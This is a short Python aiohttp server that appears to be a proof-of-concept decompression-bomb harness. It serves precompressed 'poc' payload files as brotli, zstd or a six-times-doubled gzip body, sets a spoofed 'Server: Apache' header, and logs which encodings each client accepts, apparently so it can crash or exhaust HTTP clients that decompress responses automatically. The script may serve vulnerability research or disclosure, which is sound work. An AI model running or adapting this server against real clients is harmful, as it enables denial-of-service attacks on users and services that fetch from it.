from aiohttp import web

ENABLE_BR = True
ENABLE_ZSTD = True


async def handler(req: web.Request) -> web.Response:
    resp = web.Response(content_type="text/html")
    resp.headers["Server"] = "Apache"

    if ENABLE_BR and "br" in req.headers.get("Accept-Encoding", ""):
        with open("payload/poc64.br", "rb") as f:
            resp.body = f.read()
        resp.headers["Content-Encoding"] = "br"
    elif ENABLE_ZSTD and "zstd" in req.headers.get("Accept-Encoding", ""):
        with open("payload/poc64.zst", "rb") as f:
            resp.body = f.read()
        resp.headers["Content-Encoding"] = "zstd"
    else:
        with open("payload/poc1.gz", "rb") as f:
            payload = bytearray(f.read())
        for _ in range(6):
            payload.extend(payload)
        resp.body = payload
        resp.headers["Content-Encoding"] = "gzip"

    assert not resp.compression
    return resp


if __name__ == "__main__":
    import logging
    from aiohttp.web_log import AccessLogger

    logging.basicConfig(level=logging.INFO, format="%(message)s")

    app = web.Application()
    app.router.add_get("/", handler)
    app.router.add_post("/", handler)
    web.run_app(
        app,
        port=8080,
        access_log_format=AccessLogger.LOG_FORMAT + ' "%{Accept-Encoding}i" "%{Content-Encoding}o"',
    )
